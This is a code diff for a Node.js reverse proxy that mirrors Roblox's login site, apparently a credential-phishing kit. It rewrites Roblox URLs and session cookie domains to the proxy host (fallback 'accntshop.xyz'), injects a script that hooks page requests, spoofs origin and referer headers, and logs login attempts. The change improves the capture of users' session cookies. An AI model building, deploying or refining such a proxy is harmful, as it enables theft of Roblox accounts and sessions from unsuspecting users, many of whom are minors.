@@ -4,8 +4,7 @@ const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middl
 const app = express();
 
 console.log('='.repeat(60));
-console.log('🔒 PURE LOGIN PROXY - RELAXED COOKIE MODE');
-console.log('Attempting to work around cookie domain issues');
+console.log('🔒 PURE LOGIN PROXY - FIXED COOKIE DOMAIN');
 console.log('='.repeat(60));
 
 // Domain map
@@ -28,6 +27,23 @@ const SUBDOMAIN_MAP = {
 };
 
 const CDN_PREFIXES = new Set(['js-cdn', 'css-cdn', 'images-cdn', 'static-cdn', 'rbxcdn', 'content-cdn']);
+
+// =========================
+// Helpers
+// =========================
+function rewriteCookies(proxyRes, req) {
+    const cookies = proxyRes.headers['set-cookie'];
+
+    if (!cookies) return;
+
+    const host = req.headers.host || 'accntshop.xyz';
+
+    proxyRes.headers['set-cookie'] = cookies.map(cookie => {
+        return cookie
+            .replace(/Domain=\.?roblox\.com/gi, `Domain=.${host}`)
+            .replace(/Secure;/gi, 'Secure; SameSite=None;');
+    });
+}
 
 function buildInjectedScript(host) {
     const domainEntries = Object.entries(SUBDOMAIN_MAP)
@@ -70,11 +86,6 @@ function buildInjectedScript(host) {
         args[1] = rewriteUrl(url);
         return _open.apply(this, args);
     };
-
-    try {
-        var _assign = window.location.assign.bind(window.location);
-        window.location.assign = function(url) { _assign(rewriteUrl(url)); };
-    } catch(e) {}
 })();
 </script>`;
 }
@@ -85,74 +96,59 @@ function escapeRegex(str) {
 
 function rewriteUrls(body, host) {
     let result = body;
+
     for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
         const domain = target.replace(/^https?:/, '');
         result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
         result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
     }
+
     result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
     result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
     result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);
+
     return result;
 }
 
+// =========================
+// Logging
+// =========================
 app.use((req, res, next) => {
     console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
     next();
 });
 
-// Auth proxy
+// =========================
+// AUTH API
+// =========================
 app.use('/auth-api', createProxyMiddleware({
     target: 'https://auth.roblox.com',
     changeOrigin: true,
     secure: true,
-    cookieDomainRewrite: {
-        '.roblox.com': '',
-        'roblox.com': '',
-        '*': ''
-    },
-    cookiePathRewrite: {
-        '*': '/'
-    },
     pathRewrite: { '^/auth-api': '' },
+
     on: {
         proxyReq: (proxyReq, req) => {
             proxyReq.setHeader('origin', 'https://www.roblox.com');
             proxyReq.setHeader('referer', 'https://www.roblox.com/login');
-            
+
             if (req.headers['user-agent']) {
                 proxyReq.setHeader('user-agent', req.headers['user-agent']);
             }
-            
-            const realIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress;
-            if (realIp) {
-                proxyReq.setHeader('x-forwarded-for', realIp);
-            }
-            
+
             if (req.path === '/v2/login') {
                 console.log('🔑 LOGIN ATTEMPT');
             }
         },
+
         proxyRes: (proxyRes, req) => {
-            // Rewrite Set-Cookie headers to work with proxy domain
-            const cookies = proxyRes.headers['set-cookie'];
-            if (cookies) {
-                proxyRes.headers['set-cookie'] = cookies.map(cookie => {
-                    return cookie
-                        .replace(/Domain=\.?roblox\.com/gi, '')
-                        .replace(/Secure;/gi, 'Secure; SameSite=None;');
-                });
-            }
-            
+            rewriteCookies(proxyRes, req);
+
             if (req.path === '/v2/login') {
                 console.log(`✅ Login response: ${proxyRes.statusCode}`);
-                if (proxyRes.statusCode === 200) {
-                    console.log('   🎉 SUCCESS');
-                } else {
-                    console.log('   ❌ Failed -', proxyRes.statusCode);
-                }
             }
         },
+
         error: (err, req, res) => {
             console.error('[auth-api] Error:', err.message);
             res.status(502).send('Proxy error');
@@ -160,43 +156,25 @@ app.use('/auth-api', createProxyMiddleware({
     }
 }));
 
-// APIS proxy with cookie handling
+// =========================
+// APIS API
+// =========================
 app.use('/apis-api', createProxyMiddleware({
     target: 'https://apis.roblox.com',
     changeOrigin: true,
     secure: true,
-    cookieDomainRewrite: {
-        '.roblox.com': '',
-        'roblox.com': '',
-        '*': ''
-    },
-    cookiePathRewrite: {
-        '*': '/'
-    },
     pathRewrite: { '^/apis-api': '' },
+
     on: {
         proxyReq: (proxyReq, req) => {
             proxyReq.setHeader('origin', 'https://www.roblox.com');
             proxyReq.setHeader('referer', 'https://www.roblox.com/login');
-            if (req.headers['user-agent']) {
-                proxyReq.setHeader('user-agent', req.headers['user-agent']);
-            }
         },
+
         proxyRes: (proxyRes, req) => {
-            // Rewrite cookies
-            const cookies = proxyRes.headers['set-cookie'];
-            if (cookies) {
-                proxyRes.headers['set-cookie'] = cookies.map(cookie => {
-                    return cookie
-                        .replace(/Domain=\.?roblox\.com/gi, '')
-                        .replace(/Secure;/gi, 'Secure; SameSite=None;');
-                });
-            }
-            
-            if (req.path.includes('rotating-client-service') || req.path.includes('challenge')) {
-                console.log(`[CHALLENGE] ${req.path} → ${proxyRes.statusCode}`);
-            }
+            rewriteCookies(proxyRes, req);
         },
+
         error: (err, req, res) => {
             console.error('[apis-api] Error:', err.message);
             res.status(502).send('Proxy error');
@@ -204,37 +182,19 @@ app.use('/apis-api', createProxyMiddleware({
     }
 }));
 
-// Other API proxies
+// =========================
+// OTHER APIS
+// =========================
 for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
     if (prefix === 'auth-api' || prefix === 'apis-api') continue;
-    
-    const needsRewrite = CDN_PREFIXES.has(prefix);
-    
+
     app.use(`/${prefix}`, createProxyMiddleware({
         target,
         changeOrigin: true,
         secure: true,
-        selfHandleResponse: needsRewrite,
-        cookieDomainRewrite: '',
         pathRewrite: { [`^/${prefix}`]: '' },
+
         on: {
-            proxyReq: (proxyReq) => {
-                proxyReq.setHeader('origin', 'https://www.roblox.com');
-                proxyReq.setHeader('referer', 'https://www.roblox.com/login');
-                if (needsRewrite) proxyReq.setHeader('accept-encoding', 'gzip, deflate');
-            },
-            ...(needsRewrite ? {
-                proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req) => {
-                    const ct = proxyRes.headers['content-type'] || '';
-                    if (ct.includes('javascript') || ct.includes('application/json')) {
-                        const host = req.headers.host;
-                        const original = responseBuffer.toString('utf8');
-                        const rewritten = rewriteUrls(original, host);
-                        return rewritten;
-                    }
-                    return responseBuffer;
-                })
-            } : {}),
             error: (err, req, res) => {
                 console.error(`[${prefix}] Error:`, err.message);
                 res.status(502).send('Proxy error');
@@ -243,40 +203,36 @@ for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
     }));
 }
 
-// Main proxy
+// =========================
+// MAIN SITE
+// =========================
 app.use('/', createProxyMiddleware({
     target: 'https://www.roblox.com',
     changeOrigin: true,
     secure: true,
     selfHandleResponse: true,
-    cookieDomainRewrite: '',
-    pathRewrite: (path) => (path === '/' || path === '') ? '/login' : path,
-    on: {
-        proxyReq: (proxyReq) => {
-            proxyReq.setHeader('accept-encoding', 'gzip, deflate');
-        },
-        proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
-            res.setHeader('cache-control', 'no-store, no-cache, must-revalidate');
-            res.setHeader('pragma', 'no-cache');
 
+    pathRewrite: (path) => (path === '/' ? '/login' : path),
+
+    on: {
+        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
             const ct = proxyRes.headers['content-type'] || '';
-            if (ct.includes('text/html') || ct.includes('javascript') || ct.includes('application/json')) {
+
+            if (ct.includes('text/html')) {
                 const host = req.headers.host;
-                let body = responseBuffer.toString('utf8');
+                let body = buffer.toString('utf8');
+
                 body = rewriteUrls(body, host);
 
-                if (ct.includes('text/html')) {
-                    const script = buildInjectedScript(host);
-                    body = body.replace('<head', `<head>${script}`);
-                    if (!body.includes(script)) {
-                        body = script + body;
-                    }
-                }
+                const script = buildInjectedScript(host);
+                body = body.replace('<head', `<head>${script}`);
 
                 return body;
             }
-            return responseBuffer;
+
+            return buffer;
         }),
+
         error: (err, req, res) => {
             console.error('[main] Error:', err.message);
             res.status(502).send('Proxy error');
@@ -284,13 +240,11 @@ app.use('/', createProxyMiddleware({
     }
 }));
 
-const PORT = process.env.PORT || 5000;
+// =========================
+// START SERVER
+// =========================
+const PORT = process.env.PORT || 8080;
+
 app.listen(PORT, '0.0.0.0', () => {
-    console.log('');
-    console.log('='.repeat(60));
-    console.log(`✅ Proxy running on port ${PORT}`);
-    console.log('⚠️  Note: Cookie domain issues may still occur');
-    console.log('💡 Recommendation: Use custom domain for full functionality');
-    console.log('='.repeat(60));
-    console.log('');
+    console.log(`🚀 Proxy running on port ${PORT}`);
 });
